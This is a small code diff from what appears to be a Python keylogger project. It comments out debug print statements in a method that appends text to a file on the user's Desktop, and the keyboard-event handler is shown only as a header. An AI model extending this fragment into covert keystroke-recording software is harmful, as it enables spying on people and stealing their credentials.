@@ -12,12 +12,12 @@ class Keylogger:
     def payloadFile(self, fileName):
         path = os.path.expanduser('~/Desktop')
         filePath = os.path.join(path,fileName)
-        print("File Path:",filePath)
+        #print("File Path:",filePath)
         f = open(filePath,"a+")
-        print("File opened")
+        #print("File opened")
         f.write("cool\n")
         f.close()
-        print("Done")		
+        #print("Done")		
 
 
     def keyboardEvent(self, event):
